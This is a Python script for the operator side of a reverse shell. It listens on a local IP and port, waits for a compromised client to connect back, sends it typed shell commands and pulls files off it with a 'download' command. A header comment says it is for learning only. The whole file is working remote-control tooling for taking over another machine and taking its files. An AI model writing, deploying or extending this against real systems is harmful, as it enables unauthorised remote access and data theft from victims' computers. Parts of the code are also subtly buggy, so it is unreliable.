import socket
import sys
import time


# This script was written for learning purposes. Do not run this on anyones computer without the owners consent.
# I do not take any responsibility for misuse of this script.


def server(prt):
    # Set IP and port
    LHOST = '192.168.2.126' # Local IP Address of the Host
    LPORT = int(prt) # Get port from executing cmd

    # Open Socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((LHOST, LPORT))
    sock.listen(1)
    print("Listening on port", LPORT)
    client, addr = sock.accept()
    print(f'[+] {addr} Client connected to the server')
    
    

    # Listen to commands
    while True:       
        input_header = client.recv(3096)
        command = input(input_header.decode()).encode()
        
        # Custom Commands
        # Download Command - Gets a certain file, sent from the client
        if command.decode("utf-8").split(" ")[0] == "download":
            file_name = command.decode("utf-8").split(" ")[1][::-1]
            client.send(command)
            with open(file_name, "wb") as f:
                read_data = client.recv(1024)
                while read_data:
                    read_data = client.recv(1024)
                    f.write(read_data)
                    if read_data == b"DONE":
                        break

        # no command entered
        if command is b"":
            print("Please enter a command")
            
        # any other command
        else:
            client.send(command)
            data = client.recv(3096).decode("utf-8")
            if data == "exit": # exit command - ends connection to client. The connection will not open again if the client doesnt re-run the file.
                print("Terminating connection", addr[0])
                break
            print(data)
            continue
    client.close()
    sock.close()
    
# get arguments from the cmd command
if __name__ == '__main__':
    globals()[sys.argv[1]](sys.argv[2])